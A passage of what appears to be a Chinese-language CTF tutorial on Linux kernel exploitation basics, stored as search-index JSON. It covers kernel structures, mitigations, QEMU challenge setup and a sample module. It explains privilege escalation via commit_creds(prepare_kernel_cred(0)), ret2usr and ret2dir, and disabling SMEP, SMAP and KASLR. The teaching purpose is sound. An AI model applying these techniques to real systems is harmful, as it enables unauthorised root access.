; /* saved GID of the task */ kuid_t euid ; /* effective UID of the task */ kgid_t egid ; /* effective GID of the task */ kuid_t fsuid ; /* UID for VFS ops */ kgid_t fsgid ; /* GID for VFS ops */ unsigned securebits ; /* SUID-less security management */ kernel_cap_t cap_inheritable ; /* caps our children can inherit */ kernel_cap_t cap_permitted ; /* caps we re permitted */ kernel_cap_t cap_effective ; /* caps we can actually use */ kernel_cap_t cap_bset ; /* capability bounding set */ kernel_cap_t cap_ambient ; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring ; /* default keyring to attach requested * keys to */ struct key __rcu * session_keyring ; /* keyring inherited over fork */ struct key * process_keyring ; /* keyring private to this process */ struct key * thread_keyring ; /* keyring private to this thread */ struct key * request_key_auth ; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void * security ; /* subjective LSM security */ #endif struct user_struct * user ; /* real user ID subscription */ struct user_namespace * user_ns ; /* user_ns the caps and keyrings are relative to. */ struct group_info * group_info ; /* supplementary groups for euid/fsgid */ struct rcu_head rcu ; /* RCU deletion hook */ } __randomize_layout ;","title":"cred\u7ed3\u6784\u4f53"},{"location":"kernel/linux_kernel_base/#_4","text":"\u4ecb\u7ecd\u4e0bLinux\u5185\u6838\u4e2d\u7684\u91cd\u8981\u51fd\u6570\u3002 printk()\uff1a\u5185\u6838\u6001\u7684\u6253\u5370\u51fd\u6570\uff0c\u4f46\u662f\u8f93\u51fa\u4e0d\u662f\u7ec8\u7aef\uff0c\u800c\u662f\u5185\u6838\u7f13\u51b2\u533a\uff0c\u53ef\u4ee5\u901a\u8fc7dmesg\u67e5\u770b\u3002 copy_from_user()/copy_to_user()\uff1a\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u6570\u636e\u4f20\u8f93\u7684\u51fd\u6570\uff0c\u524d\u8005\u5b9e\u73b0\u4e86\u7528\u6237\u6001\u6570\u636e\u5411\u5185\u6838\u6001\u7684\u4f20\u8f93\uff0c\u540e\u8005\u5b9e\u73b0\u4e86\u5185\u6838\u6001\u6570\u636e\u5411\u7528\u6237\u6001\u4f20\u8f93\u3002 kmalloc()\uff1a\u5185\u6838\u6001\u7684\u5185\u5b58\u5206\u914d\u51fd\u6570\uff0c\u4f7f\u7528\u7684\u662fslab/slub\u5206\u914d\u5668\u3002 commit_creds(struct cred *new)\uff1a\u5c06\u65b0\u7684cred\u7ed3\u6784\u5e94\u7528\u4e8e\u5f53\u524d\u8fdb\u7a0b\uff1b struct cred* prepare_kernel_cred(struct task_struct* daemon)\uff1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684cred\u7ed3\u6784\u3002 \u901a\u5e38\u6765\u8bf4\u5982\u679c\u53ef\u4ee5\u5728\u5185\u6838\u4e2d\u6267\u884ccommit_creds(prepare_kernel_cred(0))\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u5f53\u524d\u8fdb\u7a0b\u7684uid\u548cgid\u4e3a0\uff0c\u5b9e\u73b0\u672c\u5730\u63d0\u6743\u3002 \u5982\u4e0b\u56fe\uff0c\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b/proc/kallsyms\u6765\u83b7\u53d6\u4e24\u4e2a\u51fd\u6570\u7684\u5730\u5740\u3002 \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b\u5185\u6838\u7b26\u53f7\u8868\u3002Linux\u5185\u6838\u662f\u4e2a\u6574\u4f53\u7ed3\u6784\uff0c\u6a21\u5757\u662f\u63ba\u5165\u5176\u4e2d\u7684\u63d2\u4ef6\u3002\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5185\u6838\u6574\u4f53\u770b\u505a\u4e00\u4e2a\u5927\u6a21\u5757\u3002\u90a3\u4e48\u6a21\u5757\u548c\u6a21\u5757\u4e4b\u95f4\u4ea4\u4e92\u4e00\u79cd\u5e38\u7528\u7684\u65b9\u6cd5\u5c31\u662f\u5171\u4eab\u53d8\u91cf\u548c\u51fd\u6570\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u6a21\u5757\u4e2d\u7684\u6bcf\u4e2a\u53d8\u91cf\u548c\u51fd\u6570\u90fd\u80fd\u88ab\u5171\u4eab\uff0c\u5185\u6838\u4e2d\u53ea\u628a\u5404\u4e2a\u6a21\u5757\u4e2d\u4e3b\u8981\u7684\u53d8\u91cf\u548c\u51fd\u6570\u653e\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u533a\u6bb5\uff0c\u8fd9\u4e9b\u53d8\u91cf\u548c\u51fd\u6570\u5c31\u79f0\u4e3a\u7b26\u53f7\u3002\u5728kernel/ksyms.c\u4e2d\u5b9a\u4e49\u4e86\u53ef\u4ee5\u4ece\u5185\u6838\u8fd9\u4e2a\u7279\u6b8a\u7684\u201c\u6a21\u5757\u201d\u4e2d\u53ef\u4ee5export\u7684\u7b26\u53f7\uff0c\u4f8b\u5982\u8fdb\u7a0b\u7ba1\u7406\u5b50\u7cfb\u7edf\uff0c\u90a3\u4e48\u53ef\u4ee5export\u7684\u7b26\u53f7\u5982\u4e0b\uff1a /*\u8fdb\u7a0b\u7ba1\u7406 */ EXPORT_SYMBOL ( do_mmap_pgoff ); EXPORT_SYMBOL ( do_munmap ); EXPORT_SYMBOL ( do_brk ); EXPORT_SYMBOL ( exit_mm ); \u2026 EXPORT_SYMBOL ( schedule ); EXPORT_SYMBOL ( jiffies ); EXPORT_SYMBOL ( xtime ); \u2026 \u8fd9\u4e9b\u7b26\u53f7\u539f\u672c\u662f\u5185\u6838\u5185\u90e8\u7684\u7b26\u53f7\uff0c\u901a\u8fc7EXPORT_SYMBOL\u8fd9\u4e2a\u5b8f\u540e\u5c31\u4f1a\u88ab\u653e\u5728\u4e00\u4e2a\u516c\u5f00\u7684\u5730\u65b9\uff0c\u4f7f\u5f97\u88c5\u5165\u5230\u5185\u6838\u4e2d\u7684\u5176\u4ed6\u6a21\u5757\u53ef\u4ee5\u5e94\u7528\u5b83\u4eec\u3002\u4ec5\u4ec5\u77e5\u9053\u7b26\u53f7\u7684\u540d\u5b57\u662f\u4e0d\u591f\u7684\uff0c\u8fd8\u9700\u8981\u77e5\u9053\u5b83\u4eec\u5728\u5185\u6838\u7a7a\u95f4\u4e2d\u7684\u5730\u5740\u624d\u6709\u610f\u4e49\u3002\u5185\u6838\u4e2d\u5b9a\u4e49\u4e86\u5982\u4e0b\u7ed3\u6784\u6765\u63cf\u8ff0\u6a21\u5757\u7684\u7b26\u53f7\uff1a struct module_symbol { unsigned long value;\uff0f*\u7b26\u53f7\u5728\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5730\u5740*/ const char *name; /*\u7b26\u53f7\u540d*/ }; /proc/ksyms\uff082.6\u4ee5\u540e\u7248\u672c\u901a\u8fc7/proc/kallsyms\uff09\u6587\u4ef6\u53ef\u4ee5\u8bfb\u51fa\u6240\u6709\u5185\u6838\u6a21\u5757export\u7684\u7b26\u53f7\uff08\u5982\u56fex.2\uff09\uff0c\u8fd9\u4e9b\u7b26\u53f7\u5c31\u5f62\u6210\u4e86\u5185\u6838\u7b26\u53f7\u8868\uff0c\u5176\u683c\u5f0f\u4e3a\uff1a \u5185\u5b58\u5730\u5740 \u7b26\u53f7\u540d \uff3b\u6240\u5c5e\u6a21\u5757\uff3d \u5728Linux\u6a21\u5757\u53d8\u6210\u4e2d\uff0c\u53ef\u4ee5\u6839\u636e\u7b26\u53f7\u540d\u76f4\u63a5\u4ece\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u68c0\u7d22\u51fa\u5176\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u7136\u540e\u76f4\u63a5\u8bbf\u95ee\u8be5\u5730\u5740\u5c31\u53ef\u4ee5\u83b7\u5f97\u5185\u6838\u6570\u636e\u3002\u5982\u679c\u7b26\u53f7\u662f\u4ece\u5185\u6838\uff08\u90a3\u4e2a\u6bcd\u6a21\u5757\uff09\u76f4\u63a5export\u7684\uff0c\u90a3\u4e48\u7b2c\u4e09\u5217\u7684\u6240\u5c5e\u6a21\u5757\u5c31\u4f1a\u4e3a\u7a7a\u3002 \u5185\u6838\u7b26\u53f7\u8868\u8bb0\u5f55\u4e86\u6240\u6709\u6a21\u5757\u53ef\u4ee5\u8bbf\u95ee\u7684\u7b26\u53f7\u53ca\u76f8\u5e94\u7684\u5730\u5740\uff0c\u5f53\u4e00\u4e2a\u65b0\u7684\u6a21\u5757\u88ab\u88c5\u5165\u5185\u6838\u540e\uff0c\u5176\u58f0\u660e\u7684\u67d0\u4e9b\u7b26\u53f7\u5c31\u4f1a\u88ab\u767b\u8bb0\u5230\u8fd9\u4e2a\u8868\u4e2d\uff0c\u5e76\u4e14\u5c31\u53ef\u80fd\u88ab\u5176\u4ed6\u6a21\u5757\u6240\u5f15\u7528\uff0c\u8fd9\u4e2a\u5c31\u662f\u6a21\u5757\u4f9d\u8d56\u3002\u6a21\u5757A\u5f15\u7528\u6a21\u5757B\u7684export\u51fa\u6765\u7b26\u53f7\uff0c\u90a3\u4e48\u5c31\u662f\u6a21\u5757B\u88ab\u6a21\u5757A\u5f15\u7528\uff0c\u6216\u8005\u8bf4\u6a21\u5757A\u4f9d\u8d56\u4e8e\u6a21\u5757B\u3002\u5982\u679c\u8981\u94fe\u63a5\u6a21\u5757A\uff0c\u5fc5\u987b\u5148\u94fe\u63a5\u6a21\u5757B\u3002 \u56e0\u4e3a\u6709\u6a21\u5757\u4f9d\u8d56\uff0c\u6240\u4ee5\u4e3a\u4e86\u786e\u4fdd\u6a21\u5757\u5b89\u5168\u5730\u5378\u8f7d\uff0c\u6bcf\u4e2a\u6a21\u5757\u90fd\u4f7f\u7528\u4e86\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u5668\u3002\u5f53\u6267\u884c\u6a21\u5757\u6240\u6d89\u53ca\u7684\u64cd\u4f5c\u65f6\u5c31\u9012\u589e\u8ba1\u6570\u5668\uff0c\u5728\u64cd\u4f5c\u7ed3\u675f\u65f6\u5c31\u9012\u51cf\u8fd9\u4e2a\u8ba1\u6570\u5668\uff1b\u53e6\u5916\uff0c\u5f53\u6a21\u5757B\u88ab\u6a21\u5757A\u5f15\u7528 \u65f6\uff0c\u6a21\u5757B\u7684\u5f15\u7528\u8ba1\u6570\u5c31\u9012\u589e\uff0c\u5f15\u7528\u7ed3\u675f\uff0c\u8ba1\u6570\u5668\u9012\u51cf\u3002\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u5378\u8f7d\u8fd9\u4e2a\u6a21\u5757\uff1f\u5f53\u7136\u53ea\u6709\u8fd9\u4e2a\u8ba1\u6570\u5668\u503c\u4e3a0\u7684\u65f6\u5019\u3002 \u53e6\u5916\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528nm\u6307\u4ee4\u6765\u5217\u51fako\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\uff1a","title":"\u5185\u6838\u6001\u51fd\u6570\u548c\u7b26\u53f7"},{"location":"kernel/linux_kernel_base/#_5","text":"\u5185\u6838\u4e2d\u4e5f\u9700\u8981\u4f7f\u7528\u5230\u5185\u5b58\u7684\u5206\u914d\uff0c\u7c7b\u4f3c\u4e8e\u7528\u6237\u7a7a\u95f4malloc\u7684\u529f\u80fd\u3002\u5728\u5185\u6838\u4e2d\u6ca1\u6709libc\uff0c\u6240\u4ee5\u6ca1\u6709malloc\uff0c\u4f46\u662f\u9700\u8981\u8fd9\u6837\u7684\u529f\u80fd\uff0c\u6240\u4ee5\u6709kmalloc\uff0c\u5176\u5b9e\u73b0\u662f\u4f7f\u7528\u7684slab/slub\u5206\u914d\u5668\uff0c\u73b0\u5728\u591a\u89c1\u7684\u662fslub\u5206\u914d\u5668\u3002\u8fd9\u4e2a\u5206\u914d\u5668\u901a\u8fc7\u4e00\u4e2a\u591a\u7ea7\u7684\u7ed3\u6784\u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\u6709cache\u5c42\uff0ccache\u662f\u4e00\u4e2a\u7ed3\u6784\uff0c\u91cc\u8fb9\u901a\u8fc7\u4fdd\u5b58\u7a7a\u5bf9\u8c61\uff0c\u90e8\u5206\u4f7f\u7528\u7684\u5bf9\u8c61\u548c\u5b8c\u5168\u4f7f\u7528\u4e86\u5bf9\u8c61\u6765\u7ba1\u7406\uff0c\u5bf9\u8c61\u5c31\u662f\u6307\u5185\u5b58\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u5206\u914d\u6216\u8005\u5df2\u7ecf\u5206\u914d\u7684\u4e00\u90e8\u5206\u5185\u6838\u7a7a\u95f4\u3002kmalloc\u4f7f\u7528\u4e86\u591a\u4e2acache\uff0c\u4e00\u4e2acache\u5bf9\u5e94\u4e00\u4e2a2\u7684\u5e42\u5927\u5c0f\u7684\u4e00\u7ec4\u5185\u5b58\u5bf9\u8c61\u3002slab\u5206\u914d\u5668\u4e25\u683c\u6309\u7167cache\u53bb\u533a\u5206\uff0c\u4e0d\u540ccache\u7684\u65e0\u6cd5\u5206\u914d\u5728\u4e00\u9875\u5185\uff0cslub\u5206\u914d\u5668\u5219\u8f83\u4e3a\u5bbd\u677e\uff0c\u4e0d\u540ccache\u5982\u679c\u5206\u914d\u76f8\u540c\u5927\u5c0f\uff0c\u53ef\u80fd\u4f1a\u5728\u4e00\u9875\u5185\u3002","title":"\u5185\u6838\u5185\u5b58\u5206\u914d"},{"location":"kernel/linux_kernel_base/#_6","text":"Dmesg Restrictions \uff1a\u901a\u8fc7\u8bbe\u7f6e/proc/sys/kernel/dmesg_restrict\u4e3a1\uff0c\u53ef\u4ee5\u5c06dmesg\u8f93\u51fa\u7684\u4fe1\u606f\u89c6\u4e3a\u654f\u611f\u4fe1\u606f\uff08\u9ed8\u8ba4\u4e3a0\uff09\uff1b Kernel Address Display Restriction \uff1a/proc/sys/kernel/kptr_restrict\u88ab\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a1\uff0c\u5bfc\u81f4\u65e0\u6cd5\u901a\u8fc7/proc/kallsyms\u83b7\u53d6\u5185\u6838\u5730\u5740\uff0c\u5982\u4e0b\u56fe\uff1b Kernel PageTable Isolation \uff1aKPTI\uff0c\u5185\u6838\u9875\u8868\u9694\u79bb\uff0c\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u88ab\u5206\u6210\u4e86\u5185\u6838\u5730\u5740\u7a7a\u95f4\u548c\u7528\u6237\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d\u5185\u6838\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u4e86\u6574\u4e2a\u7269\u7406\u5730\u5740\u7a7a\u95f4\uff0c\u800c\u7528\u6237\u5730\u5740\u7a7a\u95f4\u53ea\u80fd\u6620\u5c04\u5230\u6307\u5b9a\u7684\u7269\u7406\u5730\u5740\u7a7a\u95f4\u3002\u5185\u6838\u5730\u5740\u7a7a\u95f4\u548c\u7528\u6237\u5730\u5740\u7a7a\u95f4\u5171\u7528\u4e00\u4e2a\u9875\u5168\u5c40\u76ee\u5f55\u8868\u3002\u4e3a\u4e86\u5f7b\u5e95\u9632\u6b62\u7528\u6237\u7a0b\u5e8f\u83b7\u53d6\u5185\u6838\u6570\u636e\uff0c\u53ef\u4ee5\u4ee4\u5185\u6838\u5730\u5740\u7a7a\u95f4\u548c\u7528\u6237\u5730\u5740\u7a7a\u95f4\u4f7f\u7528\u4e24\u7ec4\u9875\u8868\u96c6\u3002Windows\u79f0\u5176\u4e3aKVA Shadow\uff1b Kernel ASLR \uff1a\u5185\u6838\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff1b SMAP/SMEP \uff1aSMAP\uff08Supervisor Mode Access Prevention\uff0c\u7ba1\u7406\u6a21\u5f0f\u8bbf\u95ee\u4fdd\u62a4\uff09\u548cSMEP\uff08Supervisor Mode Execution Prevention\uff0c\u7ba1\u7406\u6a21\u5f0f\u6267\u884c\u4fdd\u62a4\uff09\u7684\u4f5c\u7528\u5206\u522b\u662f\u7981\u6b62\u5185\u6838\u8bbf\u95ee\u7528\u6237\u7a7a\u95f4\u7684\u6570\u636e\u548c\u7981\u6b62\u5185\u6838\u6267\u884c\u7528\u6237\u7a7a\u95f4\u7684\u4ee3\u7801\u3002arm\u91cc\u9762\u53ebPXN\uff08Privilege Execute Never\uff09\u548cPAN\uff08Privileged Access Never\uff09\u3002\u548cNX\u4e00\u6837SMAP/SMEP\u9700\u8981\u5904\u7406\u5668\u652f\u6301\uff0c\u5982\u4e0b\u56fe\uff0c\u53ef\u4ee5\u901a\u8fc7cat /proc/cpuinfo\u67e5\u770b\uff0c\u5728\u5185\u6838\u547d\u4ee4\u884c\u4e2d\u6dfb\u52a0nosmap\u548cnosmep\u7981\u7528,\u662f\u5426\u5f00\u542f\u7531CPU\u7684CR4\u5bc4\u5b58\u5668\u7ba1\u7406. \u5728\u6ca1\u6709SMAP/SMEP\u7684\u60c5\u51b5\u4e0b\u628a\u5185\u6838\u6307\u9488\u91cd\u5b9a\u5411\u5230\u7528\u6237\u7a7a\u95f4\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u88ab\u79f0\u4e3aret2usr\u3002physmap\u662f\u5185\u6838\u7ba1\u7406\u7684\u4e00\u5757\u975e\u5e38\u5927\u7684\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\uff0c\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u8be5\u7a7a\u95f4\u5730\u5740\u548cRAM\u5730\u5740\u76f4\u63a5\u6620\u5c04\u3002RAM\u76f8\u5bf9physmap\u8981\u5c0f\u5f97\u591a\uff0c\u5bfc\u81f4\u4e86\u4efb\u4f55\u4e00\u4e2aRAM\u5730\u5740\u90fd\u53ef\u4ee5\u5728physmap\u4e2d\u627e\u5230\u5176\u5bf9\u5e94\u7684\u865a\u62df\u5185\u5b58\u5730\u5740\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u77e5\u9053\u7528\u6237\u7a7a\u95f4\u7684\u865a\u62df\u5185\u5b58\u4e5f\u4f1a\u6620\u5c04\u5230RAM\u3002\u8fd9\u5c31\u5b58\u5728\u4e24\u4e2a\u865a\u62df\u5185\u5b58\u5730\u5740\uff08\u4e00\u4e2a\u5728physmap\u5730\u5740\uff0c\u4e00\u4e2a\u5728\u7528\u6237\u7a7a\u95f4\u5730\u5740\uff09\u6620\u5c04\u5230\u540c\u4e00\u4e2aRAM\u5730\u5740\u7684\u60c5\u51b5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5728\u7528\u6237\u7a7a\u95f4\u91cc\u521b\u5efa\u7684\u6570\u636e\uff0c\u4ee3\u7801\u5f88\u6709\u53ef\u80fd\u6620\u5c04\u5230physmap\u7a7a\u95f4\u3002\u57fa\u4e8e\u8fd9\u4e2a\u7406\u8bba\u5728\u7528\u6237\u7a7a\u95f4\u7528mmap()\u628a\u63d0\u6743\u4ee3\u7801\u6620\u5c04\u5230\u5185\u5b58\uff0c\u7136\u540e\u518d\u5728physmap\u91cc\u627e\u5230\u5176\u5bf9\u5e94\u7684\u526f\u672c\uff0c\u4fee\u6539EIP\u8df3\u5230\u526f\u672c\u6267\u884c\u5c31\u53ef\u4ee5\u4e86\u3002\u56e0\u4e3aphysmap\u672c\u8eab\u5c31\u662f\u5728\u5185\u6838\u7a7a\u95f4\u91cc\uff0c\u6240\u4ee5SMAP/SMEP\u90fd\u4e0d\u4f1a\u53d1\u6325\u4f5c\u7528\u3002\u8fd9\u79cd\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u53ebret2dir\u3002\u5173\u95edSMEP\u65b9\u6cd5\u4fee\u6539 /etc/default/grub \u6587\u4ef6\u4e2d\u7684GRUB_CMDLINE_LINUX=\"\"\uff0c\u52a0\u4e0anosmep/nosmap/nokaslr\uff0c\u7136\u540e update-grub \u5c31\u597d; Stack Protector \uff1a\u548c\u7528\u6237\u6001\u76f8\u540c\uff0ccanary\uff1b Address Protection \uff1a\u5185\u6838\u7a7a\u95f4\u548c\u7528\u6237\u7a7a\u95f4\u5171\u4eab\u865a\u62df\u5185\u5b58\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u9632\u6b62\u7528\u6237\u7a7a\u95f4mmap\u7684\u5185\u5b58\u4ece0\u5f00\u59cb\uff0c\u4ece\u800c\u7f13\u89e3\u7a7a\u6307\u9488\u5f15\u7528\u653b\u51fb\u3002windows\u7cfb\u7edf\u4ecewin8\u5f00\u59cb\u7981\u6b62\u5728\u96f6\u9875\u5206\u914d\u5185\u5b58\u3002\u4ecelinux\u5185\u68382.6.22\u5f00\u59cb\u53ef\u4ee5\u4f7f\u7528sysctl\u8bbe\u7f6emmap_min_addr\u6765\u5b9e\u73b0\u8fd9\u4e00\u4fdd\u62a4\u3002","title":"\u6f0f\u6d1e\u7f13\u51b2\u673a\u5236"},{"location":"kernel/linux_kernel_base/#ctflinux-kernel","text":"CTF\u4e2d\u7684Linux Kernel\u9898\u76ee\u4f1a\u4f7f\u7528qemu\u542f\u52a8\uff0c\u901a\u5e38\u6765\u8bf4\u4f1a\u7ed9\u4ee5\u4e0b\u4e09\u4e2a\u6587\u4ef6\uff1a 1. boot.sh\uff1a\u542f\u52a8kernel\u7684shell\u811a\u672c\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u542f\u52a8\u53c2\u6570\u7684\u503c\u770b\u51fa\u4e0d\u540c\u7684\u4fdd\u62a4\u63aa\u65bd\uff1b 2. bzImage\uff1a\u5185\u6838\u7684binary\uff1b 3. rootfs.cpio\uff1a\u542f\u52a8\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u901a\u5e38\u4f1a\u5728\u91cc\u9762\u653e\u7f6e\u4e00\u4e2a\u5047\u7684flag\uff0c\u53ef\u4ee5\u901a\u8fc7cpio\u8fdb\u884c\u89e3\u538b\uff08cpio -idmv rootfs.cpio\uff09\u3002 \u4e5f\u6709\u53ef\u80fd\u4f1a\u7ed9\u5185\u6838\u7684\u6e90\u7801\u548cko\u6587\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\u7ed9ko\u6587\u4ef6\uff0c\u90a3\u53ef\u4ee5\u901a\u8fc7\u89e3cpio\u6587\u4ef6\u5f97\u5230ko\u6587\u4ef6\u3002 \u7136\u540e\u9700\u8981\u4e86\u89e3\u7684\u5c31\u662fqemu\u7684\u542f\u52a8\u53c2\u6570\uff1a #!/bin/sh cd /home/gnote stty intr ^ ] exec timeout 120 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append loglevel=3 console=ttyS0 oops=panic panic=1 kaslr -nographic -net user -net nic -device e1000 -smp cores = 2 ,threads = 2 -cpu kvm64,+smep -monitor /dev/null 2 /dev/null \u5176\u4ed6\u53c2\u6570\u90fd\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u8fd9\u91cc\u6709\u51e0\u4e2a\u53c2\u6570\u9700\u8981\u683c\u5916\u6ce8\u610f\uff1a -append \"loglevel=3 console=ttyS0 oops=panic panic=1 kaslr\"\uff1a\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u4e86kaslr\uff1b -smp cores=2,threads=2\uff1a\u8fd9\u4e2a\u53c2\u6570\u5236\u5b9a\u4e86\u6838\u6570\uff1b -cpu kvm64,+smep\uff1a\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u4e86kvm\uff0c\u5e76\u4e14\u5f00\u542f\u4e86smep\uff1b -m 64M\uff1a\u8fd9\u4e2a\u53c2\u6570\u8bbe\u7f6e\u4e86\u865a\u62dfRAM\u7684\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a128M\uff1b -monitor /dev/null 2 /dev/null\uff1a\u8fd9\u4e2a\u53c2\u6570\u5173\u95ed\u4e86qemu\u7684monitor\u6a21\u5f0f\uff0c\u5982\u679c\u6ca1\u6709\u5173\u95ed\u7684\u8bdd\uff0c\u6211\u4eec\u662f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7qemu\u7684monitor\u6a21\u5f0f\u5f97\u5230flag\u7684\uff0c\u8fd9\u4e2a\u7ecf\u5e38\u4f1a\u6709CTF\u51fa\u9898\u8005\u56e0\u4e3a\u6ca1\u6709\u6ce8\u610f\u800c\u5bfc\u81f4\u975e\u9884\u671f\u89e3\u3002 \u8fd8\u6709\u4e00\u4e2a\u8f83\u4e3a\u6709\u7528\u7684\u6587\u4ef6\u662fcpio\u4e2d\u7684init\u6587\u4ef6\uff1a #!/bin/sh /bin/mount -t devtmpfs devtmpfs /dev chown root:tty /dev/console chown root:tty /dev/ptmx chown root:tty /dev/tty mkdir -p /dev/pts mount -vt devpts -o gid = 4 ,mode = 620 none /dev/pts mount -t proc proc /proc mount -t sysfs sysfs /sys echo 2 /proc/sys/kernel/kptr_restrict echo 1 /proc/sys/kernel/dmesg_restrict #echo 0 /proc/sys/kernel/kptr_restrict #echo 0 /proc/sys/kernel/dmesg_restrict ifup eth0 /dev/null 2 /dev/null insmod gnote.ko \u2026\u2026 init\u6587\u4ef6\u4e2d\u6709\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230\u5f00\u4e86\u54ea\u4e9b\u5185\u6838\u4fdd\u62a4\u63aa\u65bd\u4ee5\u53ca\u9898\u76ee\u505a\u7684\u4e00\u4e9b\u5947\u602a\u7684\u64cd\u4f5c\u3002","title":"CTF\u4e2d\u7684Linux Kernel\u9898\u76ee"},{"location":"kernel/linux_kernel_base/#kernel","text":"\u672c\u8282\u6211\u4eec\u5c1d\u8bd5\u7f16\u5199\u4e00\u4e2aKernel\u7a0b\u5e8f\u5e76\u5728Linux\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7136\u540e\u5206\u6790\u4e00\u4e0b\u6e90\u7801\u5e76\u8fdb\u884c\u9006\u5411\u3002\u9996\u5148\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684Kernel\u7a0b\u5e8f\uff1a #include linux/module.h #include linux/kernel.h #include linux/init.h static int __init lkp_init ( void ) { printk ( Hello,World! \\n ); return 0 ; } static void __exit lkp_cleanup ( void ) { printk ( Goodbye, World! \\n ); } module_init ( lkp_init ); module_exit ( lkp_cleanup ); \u9996\u5148\u5bf9\u7a0b\u5e8f\u6e90\u7801\u8fdb\u884c\u5206\u6790\uff0c\u9996\u5148\u662f\u5934\u6587\u4ef6\uff0clinux/module.h\u662fLinux\u5185\u6838\u6a21\u5757\u53d8\u6210\u5fc5\u987b\u5305\u542b\u7684\u5934\u6587\u4ef6\uff0c\u5934\u6587\u4ef6kernel.h\u5305\u542b\u4e86\u5e38\u7528\u7684\u5185\u6838\u51fd\u6570\uff0c\u5934\u6587\u4ef6init.h\u5305\u542b\u4e86\u5b8f_init\u548c_exit\uff0c\u5b83\u4eec\u5141\u8bb8\u91ca\u653e\u5185\u6838\u5360\u7528\u7684\u5185\u5b58\u3002\u63a5\u4e0b\u6765\u662flkp_init\u51fd\u6570\uff0c\u8fd9\u4e2a\u662f\u6a21\u5757\u7684\u521d\u59cb\u5316\u51fd\u6570\uff0c\u5b83\u4f1a\u5728\u5185\u6838\u6a21\u5757\u88ab\u52a0\u8f7d\u7684\u65f6\u5019\u6267\u884c\uff0c\u4f7f\u7528__init\u8fdb\u884c\u4fee\u9970\uff0c\u4e00\u822c\u7528\u5b83\u6765\u521d\u59cb\u5316\u6570\u636e\u7ed3\u6784\u7b49\u5185\u5bb9\uff1blkp_cleanup\u51fd\u6570\u662f\u6a21\u5757\u7684\u9000\u51fa\u51fd\u6570\uff0c\u4ed6\u4f1a\u5728\u6a21\u5757\u5728\u9000\u51fa\u7684\u65f6\u5019\u6267\u884c\u3002\u51fd\u6570module_init()\u548ccleanup_exit()\u662f\u6a21\u5757\u7f16\u7a0b\u4e2d\u6700\u57fa\u672c\u4e5f\u662f\u5fc5\u987b\u7684\u4e24\u4e2a\u51fd\u6570\uff0c\u5b83\u7528\u6765\u6307\u5b9a\u6a21\u5757\u52a0\u8f7d\u548c\u9000\u51fa\u65f6\u8c03\u7528\u7684\u51fd\u6570\uff0c\u8fd9\u91cc\u52a0\u8f7d\u7684\u662f\u6211\u4eec\u4e0a\u9762\u5b9a\u4e49\u597d\u7684\u4e24\u4e2a\u51fd\u6570\u3002\u4e0a\u8ff0\u4e24\u4e2a\u51fd\u6570\u5fc5\u987b\u5728\u5185\u6838\u6a21\u5757\u4e2d\u5305\u542b\uff0cmodule_init()\u5411\u5185\u6838\u6ce8\u518c\u6a21\u5757\u6240\u63d0\u4f9b\u7684\u65b0\u529f\u80fd\uff0c\u800ccleanup_exit()\u6ce8\u9500\u7531\u6a21\u5757\u63d0\u4f9b\u7684\u6240\u6709\u529f\u80fd\u3002\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86printk\u51fd\u6570\uff0c\u8fd9\u662f\u5185\u6838\u7684\u6253\u5370\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528dmesg\u6307\u4ee4\u770b\u5230\u5185\u6838\u6253\u5370\u7684\u4fe1\u606f\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u7f16\u8bd1\u8fd9\u6bb5\u4ee3\u7801\uff0c\u9996\u5148\u6211\u4eec\u8981\u5236\u4f5c\u4e00\u4e2aMakefile\u6587\u4ef6\uff1a KERNAL_DIR ? = /lib/modules/ $( shell uname -r ) /build PWD : = $( shell pwd ) obj-m : = c1.o modules: $( MAKE ) -C $( KERNAL_DIR ) M = $( PWD ) modules 